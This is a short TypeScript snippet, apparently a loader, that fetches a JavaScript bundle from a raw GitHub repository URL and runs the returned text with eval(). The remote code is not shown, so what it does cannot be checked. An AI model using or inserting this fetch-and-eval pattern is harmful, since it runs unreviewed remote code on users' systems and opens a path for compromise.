```ts
fetch("https://raw.githubusercontent.com/Tester284/crispy-invention/main/dist/bundle.js")
.then((res) => res.text()
.then((t) => eval(t)))
```
